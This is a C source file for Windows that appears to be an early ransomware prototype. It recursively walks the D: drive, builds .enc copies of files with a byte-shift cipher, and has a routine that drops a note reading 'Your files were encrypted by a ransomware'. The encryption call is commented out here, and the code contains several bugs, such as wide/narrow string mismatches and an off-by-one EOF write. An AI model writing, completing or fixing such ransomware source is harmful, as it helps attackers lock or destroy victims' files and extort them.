#include <stdio.h>
#include <string.h>
#include <Windows.h>
#include <tchar.h>
#include <locale.h>
#include <wchar.h>

char* convertWCharToChar(wchar_t* wcharToConvert);

int main() {
	setLocaleUTF8ToAvoidChineseCharErrors();
	//iterateFolder("C:\\Users\\Deyvisson Breno\\Desktop\\Teste");
	iterateFolder("D:");
}

setLocaleUTF8ToAvoidChineseCharErrors() {
	_wsetlocale(LC_ALL, L".UTF8");
}

createFile(char path[]) {
	char fullPath[260];
	char fileName[] = "/What happened with your files.txt";
	strcpy(fullPath, path);
	strcat(fullPath, fileName);

	FILE *file = fopen(fullPath, "w");

	fputs("What happened with your files?\r\n\r\n", file);
	fputs("Your files were encrypted by a ransomware", file);

	fclose(file);
	printf("arquivo criado: %s\n", fullPath);
}

iterateFolder(char initialPath[]) {

	char path[260];

	strcpy(path, initialPath);
	strcat(path, "\\*");

	WIN32_FIND_DATA fdata;
	HANDLE hFind = NULL;

	hFind = FindFirstFileA(path, &fdata);

	if (hFind == INVALID_HANDLE_VALUE) {
		printf("Path not found: %d", GetLastError());
		return;
	}
	do {
		if (hFind == INVALID_HANDLE_VALUE) {
			continue;
		}
		if (strcmp(fdata.cFileName, ".") != 0 && strcmp(fdata.cFileName, "..") != 0 ) {
			if (fdata.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) {
				wprintf(L"folder: %s\r\n", fdata.cFileName);

				char subFolder[260];
				strcpy(subFolder, initialPath);
				strcat(subFolder, "\\");
				char* convertedFolder = convertWCharToChar(fdata.cFileName);
				strcat(subFolder, convertedFolder);
				iterateFolder(subFolder);

			}
			else if (fdata.dwFileAttributes == FILE_ATTRIBUTE_ARCHIVE) {
				wprintf(L"file: %s\r\n", fdata.cFileName);
				char fullFilePath[2048];
				char* convertedFileName = convertWCharToChar(fdata.cFileName);
				strcpy(fullFilePath, initialPath);
				strcat(fullFilePath, "\\");
				strcat(fullFilePath, convertedFileName);
				printf(fullFilePath);
				char encryptedFilePath[2048];
				strcpy(encryptedFilePath, fullFilePath);
				strcat(encryptedFilePath, ".enc");
				printf(encryptedFilePath);
				//encryptFile(fullFilePath, encryptedFilePath);
			}
			else {
				printf("Not supported file, skipping");
			}
		}
	} while (FindNextFile(hFind, &fdata));
	FindClose(hFind);
}

encryptFile(char sourceFilePath[], char destitationFilePath[]) {
	FILE *sourceFile = fopen(sourceFilePath, "rb");
	FILE *destinationFile = fopen(destitationFilePath, "wb");

	if (!sourceFile || !destinationFile) {
		printf("An error has occured while opening source/destination files");
		exit(1);
	}

	int c;	

	do {
		c = fgetc(sourceFile);
		fputc(c + 3, destinationFile);
	} while (c != EOF);

	fclose(sourceFile);
	fclose(destinationFile);
}

decryptFile(char sourceFilePath[], char destitationFilePath[]) {
	FILE* sourceFile = fopen(sourceFilePath, "rb");
	FILE* destinationFile = fopen(destitationFilePath, "wb");

	if (!sourceFile || !destinationFile) {
		printf("An error has occured while opening source/destination files");
		exit(1);
	}

	int c;

	c = fgetc(sourceFile);

	while (c != EOF) {
		fputc(c - 3, destinationFile);
		c = fgetc(sourceFile);
	}

	fclose(sourceFile);
	fclose(destinationFile);
}

char* convertWCharToChar(wchar_t* wchar) {
	int size = wcstombs(NULL, wchar, 0);
	char* convertedPath = (char*)malloc(size + 1);
	wcstombs(convertedPath, wchar, size + 1);
	return convertedPath;
}